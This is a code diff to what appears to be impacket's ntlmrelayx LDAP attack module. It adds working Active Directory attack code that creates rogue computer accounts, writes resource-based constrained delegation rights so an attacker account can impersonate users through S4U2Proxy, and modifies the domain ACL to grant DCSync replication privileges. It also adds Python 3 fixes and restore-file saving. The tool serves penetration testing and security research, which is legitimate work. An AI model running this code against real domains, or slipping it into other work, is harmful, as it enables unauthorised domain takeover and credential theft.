@@ -15,20 +15,25 @@
 #
 # ToDo:
 #
+import _thread
 import random
 import string
-import thread
-import ldapdomaindump
+import json
+import datetime
+import binascii
+import codecs
+import re
 import ldap3
+import ldapdomaindump
+from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
+from ldap3.utils.conv import escape_filter_chars
+
 from impacket import LOG
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from impacket.ldap import ldaptypes
-from impacket.uuid import string_to_bin, bin_to_string
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
-from pyasn1.type.namedtype import NamedTypes, NamedType
-from pyasn1.type.univ import Sequence, Integer
-from ldap3.utils.conv import escape_filter_chars
-from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
+from impacket.uuid import string_to_bin, bin_to_string
+
 # This is new from ldap3 v2.5
 try:
     from ldap3.protocol.microsoft import security_descriptor_control
@@ -42,6 +47,8 @@ PROTOCOL_ATTACK_CLASS = "LDAPAttack"
 # and to prevent privilege escalating more than once
 dumpedDomain = False
 alreadyEscalated = False
+alreadyAddedComputer = False
+delegatePerformed = []
 class LDAPAttack(ProtocolAttack):
     """
     This is the default LDAP attack. It checks the privileges of the relayed account
@@ -49,8 +56,70 @@ class LDAPAttack(ProtocolAttack):
     If the user is an Enterprise or Domain admin, a new user is added to escalate to DA.
     """
     PLUGIN_NAMES = ["LDAP", "LDAPS"]
+
+    # ACL constants
+    # When reading, these constants are actually represented by
+    # the following for Active Directory specific Access Masks
+    # Reference: https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2
+    GENERIC_READ            = 0x00020094
+    GENERIC_WRITE           = 0x00020028
+    GENERIC_EXECUTE         = 0x00020004
+    GENERIC_ALL             = 0x000F01FF
+
     def __init__(self, config, LDAPClient, username):
         ProtocolAttack.__init__(self, config, LDAPClient, username)
+
+    def addComputer(self, parent, domainDumper):
+        """
+        Add a new computer. Parent is preferably CN=computers,DC=Domain,DC=local, but can
+        also be an OU or other container where we have write privileges
+        """
+        global alreadyAddedComputer
+        if alreadyAddedComputer:
+            LOG.error('New computer already added. Refusing to add another')
+            return
+
+        # Random password
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+
+        # Get the domain we are in
+        domaindn = domainDumper.root
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+
+        # Random computername
+        newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
+        computerHostname = newComputer[:-1]
+        newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')
+
+        # Default computer SPNs
+        spns = [
+            'HOST/%s' % computerHostname,
+            'HOST/%s.%s' % (computerHostname, domain),
+            'RestrictedKrbHost/%s' % computerHostname,
+            'RestrictedKrbHost/%s.%s' % (computerHostname, domain),
+        ]
+        ucd = {
+            'dnsHostName': '%s.%s' % (computerHostname, domain),
+            'userAccountControl': 4096,
+            'servicePrincipalName': spns,
+            'sAMAccountName': newComputer,
+            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
+        }
+        LOG.debug('New computer info %s', ucd)
+        LOG.info('Attempting to create computer in: %s', parent)
+        res = self.client.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
+        if not res:
+            # Adding computers requires LDAPS
+            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
+                LOG.error('Failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing account.')
+            else:
+                LOG.error('Failed to add a new computer: %s' % str(self.client.result))
+            return False
+        else:
+            LOG.info('Adding new computer with username: %s and password: %s result: OK' % (newComputer, newPassword))
+            alreadyAddedComputer = True
+            # Return the SAM name
+            return newComputer
 
     def addUser(self, parent, domainDumper):
         """
@@ -81,8 +150,8 @@ class LDAPAttack(ProtocolAttack):
             'sAMAccountName': newUser,
             'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
         }
-        LOG.info('Attempting to create user in: %s' % parent)
-        res = self.client.add(newUserDn, ['top','person','organizationalPerson','user'], ucd)
+        LOG.info('Attempting to create user in: %s', parent)
+        res = self.client.add(newUserDn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
         if not res:
             # Adding users requires LDAPS
             if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
@@ -108,15 +177,74 @@ class LDAPAttack(ProtocolAttack):
             LOG.info('Adding user: %s to group %s result: OK' % (userName, groupName))
             LOG.info('Privilege escalation succesful, shutting down...')
             alreadyEscalated = True
-            thread.interrupt_main()
+            _thread.interrupt_main()
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
+
+    def delegateAttack(self, usersam, targetsam, domainDumper):
+        global delegatePerformed
+        if targetsam in delegatePerformed:
+            LOG.info('Delegate attack already performed for this computer, skipping')
+            return
+
+        if not usersam:
+            usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
+            self.config.escalateuser = usersam
+
+        # Get escalate user sid
+        result = self.getUserInfo(domainDumper, usersam)
+        if not result:
+            LOG.error('User to escalate does not exist!')
+            return
+        escalate_sid = str(result[1])
+
+        # Get target computer DN
+        result = self.getUserInfo(domainDumper, targetsam)
+        if not result:
+            LOG.error('Computer to modify does not exist! (wrong domain?)')
+            return
+        target_dn = result[0]
+
+        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        targetuser = None
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            targetuser = entry
+        if not targetuser:
+            LOG.error('Could not query target user properties')
+            return
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
+            LOG.debug('Currently allowed sids:')
+            for ace in sd['Dacl'].aces:
+                LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
+        except IndexError:
+            # Create DACL manually
+            sd = create_empty_sd()
+        sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
+        self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+        if self.client.result['result'] == 0:
+            LOG.info('Delegation rights modified succesfully!')
+            LOG.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
+            delegatePerformed.append(targetsam)
+        else:
+            if self.client.result['result'] == 50:
+                LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+            elif self.client.result['result'] == 19:
+                LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            else:
+                LOG.error('The server returned an error: %s', self.client.result['message'])
+        return
 
     def aclAttack(self, userDn, domainDumper):
         global alreadyEscalated
         if alreadyEscalated:
             LOG.error('ACL attack already performed. Refusing to continue')
             return
+
+        # Dictionary for restore data
+        restoredata = {}
 
         # Query for the sid of our user
         self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
@@ -135,6 +263,10 @@ class LDAPAttack(ProtocolAttack):
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
 
+        # Save old SD for restore purposes
+        restoredata['old_sd'] = binascii.hexlify(secDescData).decode('utf-8')
+        restoredata['target_sid'] = usersid
+
         secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', usersid))
         secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', usersid))
         dn = entry.entry_dn
@@ -142,12 +274,34 @@ class LDAPAttack(ProtocolAttack):
         self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
         if self.client.result['result'] == 0:
             alreadyEscalated = True
-            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain' % username)
+            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
             LOG.info('Try using DCSync with secretsdump.py and this user :)')
+
+            # Query the SD again to see what AD made of it
+            self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+            entry = self.client.entries[0]
+            newSD = entry['nTSecurityDescriptor'].raw_values[0]
+            # Save this to restore the SD later on
+            restoredata['target_dn'] = dn
+            restoredata['new_sd'] = binascii.hexlify(newSD).decode('utf-8')
+            restoredata['success'] = True
+            self.writeRestoreData(restoredata, dn)
             return True
         else:
             LOG.error('Error when updating ACL: %s' % self.client.result)
             return False
+
+    def writeRestoreData(self, restoredata, domaindn):
+        output = {}
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+        output['config'] = {'server':self.client.server.host,'domain':domain}
+        output['history'] = [{'operation': 'add_domain_sync', 'data': restoredata, 'contextuser': self.username}]
+        now = datetime.datetime.now()
+        filename = 'aclpwn-%s.restore' % now.strftime("%Y%m%d-%H%M%S")
+        # Save the json to file
+        with codecs.open(filename, 'w', 'utf-8') as outfile:
+            json.dump(output, outfile)
+        LOG.info('Saved restore state to %s', filename)
 
     def validatePrivileges(self, uname, domainDumper):
         # Find the user's DN
@@ -202,7 +356,7 @@ class LDAPAttack(ProtocolAttack):
         ]
         privs['escalateViaGroup'] = False
         for group in interestingGroups:
-            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'])
+            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls)
             groupdata = self.client.response
             self.checkSecurityDescriptors(groupdata, privs, membersids, sidmapping, domainDumper)
             if privs['escalateViaGroup']:
@@ -221,6 +375,12 @@ class LDAPAttack(ProtocolAttack):
             return False
 
     def checkSecurityDescriptors(self, entries, privs, membersids, sidmapping, domainDumper):
+        standardrights = [
+            self.GENERIC_ALL,
+            self.GENERIC_WRITE,
+            self.GENERIC_READ,
+            ACCESS_MASK.WRITE_DACL
+        ]
         for entry in entries:
             if entry['type'] != 'searchResEntry':
                 continue
@@ -229,6 +389,7 @@ class LDAPAttack(ProtocolAttack):
                 sdData = entry['raw_attributes']['nTSecurityDescriptor'][0]
             except IndexError:
                 # We don't have the privileges to read this security descriptor
+                LOG.debug('Access to security descriptor was denied for DN %s', dn)
                 continue
             hasFullControl = False
             secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR()
@@ -245,15 +406,29 @@ class LDAPAttack(ProtocolAttack):
                 if not ace.hasFlag(ACE.INHERITED_ACE) and ace.hasFlag(ACE.INHERIT_ONLY_ACE):
                     # ACE is set on this object, but only inherited, so not applicable to us
                     continue
-                # Check if the ACE has restrictions on object type
+
+                # Check if the ACE has restrictions on object type (inherited case)
                 if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                     and ace.hasFlag(ACE.INHERITED_ACE) \
                     and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT):
                     # Verify if the ACE applies to this object type
-                    if not self.aceApplies(ace, entry['raw_attributes']['objectClass']):
+                    inheritedObjectType = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
+                    if not self.aceApplies(inheritedObjectType, entry['raw_attributes']['objectClass'][-1]):
                         continue
-
+                # Check for non-extended rights that may not apply to us
+                if ace['Ace']['Mask']['Mask'] in standardrights or ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL):
+                    # Check if this applies to our objecttype
+                    if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE  and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
+                        objectType = bin_to_string(ace['Ace']['ObjectType']).lower()
+                        if not self.aceApplies(objectType, entry['raw_attributes']['objectClass'][-1]):
+                            # LOG.debug('ACE does not apply, only to %s', objectType)
+                            continue
                 if sid in membersids:
+                    # Generic all
+                    if ace['Ace']['Mask'].hasPriv(self.GENERIC_ALL):
+                        ace.dump()
+                        LOG.debug('Permission found: Full Control on %s; Reason: GENERIC_ALL via %s' % (dn, sidmapping[sid]))
+                        hasFullControl = True
                     if can_create_users(ace) or hasFullControl:
                         if not hasFullControl:
                             LOG.debug('Permission found: Create users in %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
@@ -264,35 +439,43 @@ class LDAPAttack(ProtocolAttack):
                         else:
                             # Could be a different OU where we have access
                             # store it until we find a better place
-                            if privs['createIn'] != 'CN=Users,%s' % domainDumper.root and 'organizationalUnit' in entry['raw_attributes']['objectClass']:
+                            if privs['createIn'] != 'CN=Users,%s' % domainDumper.root and b'organizationalUnit' in entry['raw_attributes']['objectClass']:
                                 privs['create'] = True
                                 privs['createIn'] = dn
                     if can_add_member(ace) or hasFullControl:
-                        if 'group' in entry['raw_attributes']['objectClass']:
+                        if b'group' in entry['raw_attributes']['objectClass']:
                             # We can add members to a group
                             if not hasFullControl:
                                 LOG.debug('Permission found: Add member to %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                             privs['escalateViaGroup'] = True
                             privs['escalateGroup'] = dn
                     if ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL) or hasFullControl:
+                        # Check if the ACE is an OBJECT ACE, if so the WRITE_DACL is applied to
+                        # a property, which is both weird and useless, so we skip it
+                        if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
+                            and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
+                            # LOG.debug('Skipping WRITE_DACL since it has an ObjectType set')
+                            continue
                         if not hasFullControl:
                             LOG.debug('Permission found: Write Dacl of %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                         # We can modify the domain Dacl
-                        if 'domain' in entry['raw_attributes']['objectClass']:
+                        if b'domain' in entry['raw_attributes']['objectClass']:
                             privs['aclEscalate'] = True
                             privs['aclEscalateIn'] = dn
 
     @staticmethod
-    def aceApplies(ace, objectClasses):
+    def aceApplies(ace_guid, object_class):
         '''
         Checks if an ACE applies to this object (based on object classes).
         Note that this function assumes you already verified that InheritedObjectType is set (via the flag).
         If this is not set, the ACE applies to all object types.
         '''
-        objectTypeGuid = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
-        for objectType, guid in OBJECTTYPE_GUID_MAP.iteritems():
-            if objectType in objectClasses and objectTypeGuid:
-                return True
+        try:
+            our_ace_guid = OBJECTTYPE_GUID_MAP[object_class]
+        except KeyError:
+            return False
+        if ace_guid == our_ace_guid:
+            return True
         # If none of these match, the ACE does not apply to this object
         return False
 
@@ -309,15 +492,28 @@ class LDAPAttack(ProtocolAttack):
 
         # Create new dumper object
         domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
-        LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
-        userSid, privs = self.validatePrivileges(self.username, domainDumper)
-        if privs['create']:
-            LOG.info('User privileges found: Create user')
-        if privs['escalateViaGroup']:
-            name = privs['escalateGroup'].split(',')[0][3:]
-            LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
-        if privs['aclEscalate']:
-            LOG.info('User privileges found: Modifying domain ACL')
+
+        # If specified validate the user's privileges. This might take a while on large domains but will
+        # identify the proper containers for escalating via the different techniques.
+        if self.config.validateprivs:
+            LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
+            userSid, privs = self.validatePrivileges(self.username, domainDumper)
+            if privs['create']:
+                LOG.info('User privileges found: Create user')
+            if privs['escalateViaGroup']:
+                name = privs['escalateGroup'].split(',')[0][3:]
+                LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
+            if privs['aclEscalate']:
+                LOG.info('User privileges found: Modifying domain ACL')
+
+        # If validation of privileges is not desired, we assumed that the user has permissions to escalate
+        # an existing user via ACL attacks.
+        else:
+            LOG.info('Assuming relayed user has privileges to escalate a user via ACL attack')
+            privs = dict()
+            privs['create'] = False
+            privs['aclEscalate'] = True
+            privs['escalateViaGroup'] = False
 
         # We prefer ACL escalation since it is more quiet
         if self.config.aclattack and privs['aclEscalate']:
@@ -371,7 +567,18 @@ class LDAPAttack(ProtocolAttack):
                 return
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
-                    'privileges. Specify a user to assign privileges to with --escalate-user')
+                          'privileges. Specify a user to assign privileges to with --escalate-user')
+
+        # Perform the Delegate attack if it is enabled and we relayed a computer account
+        if self.config.delegateaccess and self.username[-1] == '$':
+            self.delegateAttack(self.config.escalateuser, self.username, domainDumper)
+            return
+
+        # Add a new computer if that is requested
+        # privileges required are not yet enumerated, neither is ms-ds-MachineAccountQuota
+        if self.config.addcomputer:
+            self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
+            return
 
         # Last attack, dump the domain if no special privileges are present
         if not dumpedDomain and self.config.dumpdomain:
@@ -390,17 +597,49 @@ def create_object_ace(privguid, sid):
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
     acedata['ObjectType'] = string_to_bin(privguid)
-    acedata['InheritedObjectType'] = ''
+    acedata['InheritedObjectType'] = b''
     acedata['Sid'] = ldaptypes.LDAP_SID()
     acedata['Sid'].fromCanonical(sid)
+    assert sid == acedata['Sid'].formatCanonical()
     acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
     nace['Ace'] = acedata
     return nace
 
+# Create an ALLOW ACE with the specified sid
+def create_allow_ace(sid):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    nace['AceFlags'] = 0x00
+    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = 983551 # Full control
+    acedata['Sid'] = ldaptypes.LDAP_SID()
+    acedata['Sid'].fromCanonical(sid)
+    nace['Ace'] = acedata
+    return nace
+
+def create_empty_sd():
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    sd['Revision'] = b'\x01'
+    sd['Sbz1'] = b'\x00'
+    sd['Control'] = 32772
+    sd['OwnerSid'] = ldaptypes.LDAP_SID()
+    # BUILTIN\Administrators
+    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
+    sd['GroupSid'] = b''
+    sd['Sacl'] = b''
+    acl = ldaptypes.ACL()
+    acl['AclRevision'] = 4
+    acl['Sbz1'] = 0
+    acl['Sbz2'] = 0
+    acl.aces = []
+    sd['Dacl'] = acl
+    return sd
+
 # Check if an ACE allows for creation of users
 def can_create_users(ace):
     createprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD)
-    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == '':
+    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
         return False
     userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf967aba-0de6-11d0-a285-00aa003049e2'
     return createprivs and userprivs
@@ -408,7 +647,7 @@ def can_create_users(ace):
 # Check if an ACE allows for adding members
 def can_add_member(ace):
     writeprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP)
-    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == '':
+    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
         return writeprivs
     userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf9679c0-0de6-11d0-a285-00aa003049e2'
     return writeprivs and userprivs
